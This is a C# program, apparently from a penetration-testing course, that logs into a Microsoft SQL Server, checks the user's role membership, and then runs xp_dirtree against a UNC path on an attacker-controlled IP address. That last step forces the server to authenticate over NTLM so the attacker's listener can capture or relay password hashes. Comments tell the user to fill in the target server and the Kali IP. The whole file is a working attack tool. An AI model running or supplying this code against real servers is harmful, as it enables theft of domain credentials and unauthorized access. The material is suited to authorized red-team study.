using System;
using System.Data.SqlClient;

namespace UNCPathInjection
{
    class Program
    {
        static void Main(string[] args)
        {
            // 修改以下 MS SQL Server :
            String sqlServer = "dc01.corp1.com";
            String database = "master";

            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conString);

            try
            {
                con.Open();
                Console.WriteLine("[+] Authenticated to MSSQL Server \"" + sqlServer + "\" successfully!");
            }
            catch
            {
                Console.WriteLine("[-] Authentication to MSSQL Server \"" + sqlServer + "\" failed!");
                Environment.Exit(0);
            }

            String querylogin = "SELECT SYSTEM_USER;";
            SqlCommand command = new SqlCommand(querylogin, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("Logged in as: " + reader[0]);
            reader.Close();

            String queryuser = "SELECT USER_NAME();";
            command = new SqlCommand(queryuser, con);
            reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("Mapped to user: " + reader[0]);
            reader.Close();

            String querypublicrole = "SELECT IS_SRVROLEMEMBER('public');";
            command = new SqlCommand(querypublicrole, con);
            reader = command.ExecuteReader();
            reader.Read();
            Int32 role = Int32.Parse(reader[0].ToString());
            if (role == 1)
            {
                Console.WriteLine("[+] User is a member of \"public\" role!");
            }
            else
            {
                Console.WriteLine("[-] User is NOT a member of \"public\" role!");
            }
            reader.Close();

            String querysysadminrole = "SELECT IS_SRVROLEMEMBER('sysadmin');";
            command = new SqlCommand(querysysadminrole, con);
            reader = command.ExecuteReader();
            reader.Read();
            role = Int32.Parse(reader[0].ToString());
            if (role == 1)
            {
                Console.WriteLine("[+] User is a member of \"sysadmin\" role!");
            }
            else
            {
                Console.WriteLine("[-] User is NOT a member of \"sysadmin\" role!");
            }
            reader.Close();

            // 修改以下 UNC 路径中的 Kali IP 地址 :
            Console.WriteLine("[*] Forcing NTLM Authentication for Hash-Grabbing or Relaying... Check your listener!");
            String queryUNCPathInjection = "EXEC master..xp_dirtree \"\\\\192.168.45.170\\\\NonexistentAndEvil\";";
            command = new SqlCommand(queryUNCPathInjection, con);
            reader = command.ExecuteReader();
            reader.Close();

            con.Close();
        }
    }
}